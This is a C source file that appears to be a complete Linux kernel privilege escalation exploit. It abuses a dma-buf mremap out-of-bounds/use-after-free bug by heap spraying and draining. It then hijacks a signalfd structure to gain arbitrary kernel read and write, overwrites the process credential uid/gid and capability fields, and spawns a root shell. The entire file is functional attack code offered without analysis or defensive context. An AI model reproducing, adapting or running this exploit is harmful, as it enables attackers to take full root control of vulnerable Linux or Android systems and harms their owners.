#define _GNU_SOURCE
#include <bits/types/sigset_t.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/io.h>
#include <sys/mman.h>
#include <sys/signalfd.h>
#include <syscall.h>
#include <unistd.h>

#include "dma_buf_t.h"

#define PAGE_SIZE 0x1000
#define errx(ret_code, msg)                                                    \
  do {                                                                         \
    perror(msg);                                                               \
    exit(ret_code);                                                            \
  } while (0);
#define min(a, b) ((a) < (b) ? (a) : (b))

#define NUM_SPRAY_PAGES (8)
#define NUM_SPRAYS (20)
#define NUM_SPRAY_BUFS (40)
#define NUM_DRAIN_BUFS (40)
#define NUM_SCAN_ITERATIONS (1000)

#define NUM_SPRAY_FDS (90)
dma_buf_t *spray_array[NUM_SPRAY_BUFS] = {0};
int fd_array[NUM_SPRAY_FDS] = {0};

typedef void* kptr_t;

void hexdump(char *addr, size_t len) {
  const size_t line_size = 32;
  const size_t group_by = 8;
  size_t off = 0;
  int64_t rem = len;
  printf("hexdump@%p:\n", addr);
  while (rem) {
    printf("+0x%04lx:", off);
    for (int l_cnt = 0; l_cnt < line_size && rem; l_cnt++, off++, rem--) {
      if ((l_cnt % group_by) == 0)
        printf(" ");
      printf("%02hhx", addr[off]);
    }
    printf("\n");
  }
}

int spray() {
  for (int i = 0; i < NUM_SPRAYS; ++i) {

    for (int j = 0; j < NUM_SPRAY_BUFS; ++j) {
      spray_array[j] = dma_buf_create(NUM_SPRAY_PAGES * PAGE_SIZE);
    }

    for (int j = 0; j < NUM_SPRAY_BUFS; ++j) {
      close(spray_array[j]->buf_fd);
      free(spray_array[j]);
    }
  }
  return 0;
}

int drain() {
  for (int i = 0; i < NUM_DRAIN_BUFS; ++i) {
    spray_array[i] = dma_buf_create(2 * (NUM_SPRAY_PAGES)*PAGE_SIZE);
  }
  return 0;
}

int drain_free() {
  for (int i = 0; i < NUM_DRAIN_BUFS; ++i) {
    close(spray_array[i]->buf_fd);
    free(spray_array[i]);
  }
  return 0;
}

int raw_signalfd(int fd, sigset_t *sigset, size_t sizemask) {
  int ret = syscall(__NR_signalfd, fd, sigset, sizemask);
  if (ret < 0) {
    perror("[-] signalfd");
  }
  return ret;
}

static char sigfd_proc_path[128] = {0};
static int sigfd_proc_fd = -1;
static int sigfd_fd = -1;
void *signalfd_opts_ptr = NULL;
uint64_t *privdata_ptr = NULL;

void arb_read_prep(int sigfd) {
  pid_t pid = getpid();
  snprintf(sigfd_proc_path, sizeof(sigfd_proc_path), "/proc/%d/fdinfo/%d", pid,
           sigfd);
  sigfd_proc_fd = open(sigfd_proc_path, O_RDONLY);
  privdata_ptr = signalfd_opts_ptr + 0xa0;
  sigfd_fd = sigfd;
}

uint64_t read_sigmask() {
    char buf[512];
    lseek(sigfd_proc_fd, 0, SEEK_SET);
    //Read from procfs
    int read_bytes = 0;
    if((read_bytes = read(sigfd_proc_fd,buf,sizeof(buf)-1))<=0)
    {
        perror("[-] Failed to read from procfs_fd");
        exit(-1);
    }

    //Gather heap leak from procfs output
    buf[read_bytes] = 0;
    //printf("[+] Procfs: %d read\n%s\n",read_bytes, buf);
    if(read_bytes <= 50)
    {
        printf("[-] Couldn't read sigmask\n");
        printf("[-] Procfs: %d read\n%s\n",read_bytes, buf);
        return 0;
    }
    buf[read_bytes-1] = 0;
    char* hex_str = (buf+read_bytes-16-1);
    size_t hex_val = strtoull(hex_str, NULL, 16);
    return hex_val;
}

uint64_t arb_read_8(kptr_t addr)
{
    uint64_t* ptr = privdata_ptr;
    uint64_t old_val = *ptr;
    *ptr = (uint64_t)addr;

    uint64_t result = read_sigmask();
    *ptr = old_val;
    return ~result;
}

static inline int matches_signalfd_fops(void *ptr) {
  return ((uint64_t)ptr & 0xfff) == 0xf40;
}

static void arb_write_8(kptr_t dst, uint64_t value)
{
    uint64_t* ptr = privdata_ptr;
    uint64_t old_val = *ptr;
    *ptr = (uint64_t)dst;

    uint64_t written_value = ~value;

    uint64_t result = raw_signalfd(sigfd_fd, (sigset_t*) &written_value, 8);
    *ptr = old_val;
}


int main(int argc, char *argv[]) {
  printf("[+] spraying...\n");
  spray();

  printf("[+] draining...\n");
  drain();

  // for (int i = 0; i < 32; ++i) {
  //   int fd = open("/etc/passwd", O_RDONLY);
  // }

  printf("[+] creating dma buf...\n");
  dma_buf_t *dma_buf = dma_buf_create((NUM_SPRAY_PAGES - 1) * PAGE_SIZE);
  if (!dma_buf) {
    errx(EXIT_FAILURE, "[-] failed to create dma buf")
  }
  printf("[+] dma buf fd=%d\n", dma_buf->buf_fd);

  /* mmap our dma buffer */
  printf("[+] mmap dma buffer, size: 0x%04lx\n", dma_buf->size);
  void *buf = mmap(NULL, dma_buf->size, PROT_READ | PROT_WRITE, MAP_SHARED,
                   dma_buf->buf_fd, 0);
  if (buf == MAP_FAILED) {
    perror("mmap");
    errx(EXIT_FAILURE, "[-] failed to mmap dma buf");
  }
  printf("[+] mmap buf=%p\n", buf);

  /* remap to expand size */
  size_t new_size = dma_buf->size + PAGE_SIZE;
  printf("[+] remap dma buf with new_size=0x%02lx\n", new_size);
  void *remapped_buf = mremap(buf, dma_buf->size, new_size, MREMAP_MAYMOVE);
  if (remapped_buf == MAP_FAILED) {
    perror("mremap");
    errx(EXIT_FAILURE, "[-] failed to mremap dma buf");
  }
  printf("[+] mremap buf=%p\n", remapped_buf);

  printf("[+] accessing dma buf OOB...\n");
  volatile char *uaf_page = ((volatile char *)remapped_buf + dma_buf->size);
  char dummy = *uaf_page;

  // for (int i = 0; i < dma_buf->size; i += PAGE_SIZE) {
  //   *((char *)buf + i) = 1 + i / PAGE_SIZE;
  // }

  printf("[+] drain free...\n");
  //madvise((void *)uaf_page, PAGE_SIZE, MADV_DONTNEED);
  drain_free();

  int signalfd_found = 0;

  printf("[+] scanning ptr...\n");
  for (int i = 0; i < NUM_SCAN_ITERATIONS; ++i) {

    uint64_t val = 0;
    for (int j = 0; j < NUM_SPRAY_FDS; ++j) {
      fd_array[j] = raw_signalfd(-1, (sigset_t *)&val, 8);
    }

    for (int j = 0; j < PAGE_SIZE / 8; ++j) {
      uint64_t *uaf_page_ptrs = (uint64_t *)uaf_page;
      if (matches_signalfd_fops((void *)uaf_page_ptrs[j])) {
        printf("[+] signalfd found\n");
        signalfd_found = 1;
        signalfd_opts_ptr = (void *)&uaf_page_ptrs[j];
        hexdump((char *)uaf_page + j * 8, min(PAGE_SIZE - j*8, 0x200));
        break;
      }
    }

    if (signalfd_found) {
      break;
    }

    madvise((void *)uaf_page, PAGE_SIZE, MADV_DONTNEED);
    for (int j = 0; j < NUM_SPRAY_FDS; ++j) {
      close(fd_array[j]);
      fd_array[j] = -1;
    }
  }

  printf("[+] checking signalfd...\n");
  if (!signalfd_found) {
    printf("[-] signalfd not found\n");
    for (int j = 0; j < NUM_SPRAY_FDS; ++j) {
      close(fd_array[j]);
    }
    exit(EXIT_FAILURE);
  }

  // overwrite mode_ptr
  printf("[+] overwrite mode_ptr = -1...\n");
  uint64_t *mode_ptr = signalfd_opts_ptr + 24;
  uint64_t old_val = *mode_ptr;
  *mode_ptr = (uint64_t)-1;

  // find the fd_array index of the entry our page has access to
  int sigfd_idx = -1;
  for (int idx = 0; idx < NUM_SPRAY_FDS; ++idx) {
    int status = fcntl(fd_array[idx], F_GETFL);
    if (status == -1) {
      sigfd_idx = idx;
      break;
    }
  }
  *mode_ptr = old_val;
  if (sigfd_idx < 0) {
    printf("[-] Failed to get signalfd idx\n");
    exit(EXIT_FAILURE);
  }
  printf("[+] signalfd idx=%d\n", sigfd_idx);

  printf("[+] prep read...\n");
  arb_read_prep(fd_array[sigfd_idx]);

  printf("[+] read sigmask...\n");

  kptr_t creds_ptr = *(kptr_t*)(signalfd_opts_ptr+0x68);
  kptr_t uid_start = creds_ptr+4;

  uint64_t uidgid = arb_read_8(uid_start);
  printf("[+] uidgid=%lx\n", uidgid);

  for(int i=0; i<44; i++)
  {
    arb_write_8(uid_start+i, 0);
  }
  arb_write_8(uid_start+48,0x01ffffffffffULL);
  printf("[+] success\n");

  char* new_argv[] = {"/bin/sh", NULL};
  execve("/bin/sh", new_argv, NULL);

}